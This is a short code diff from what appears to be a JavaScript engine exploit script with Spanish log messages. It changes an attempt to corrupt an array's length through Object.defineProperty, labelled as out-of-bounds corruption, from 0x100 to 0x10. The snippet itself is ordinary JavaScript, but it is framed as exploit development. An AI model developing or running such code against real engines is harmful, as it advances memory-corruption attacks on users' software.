@@ -58,8 +58,8 @@
       print("[*] Intentando corrupción OOB");
       let arr = [1.1, 2.2, 3.3];
       try {
-        Object.defineProperty(arr, 'length', { value: 0x100 });
-        print("[+] Corrupt length a 0x100");
+        Object.defineProperty(arr, 'length', { value: 0x10 });
+        print("[+] Corrupt length a 0x10");
       } catch (e) {
         print("[-] No se pudo corromper length: " + e);
       }
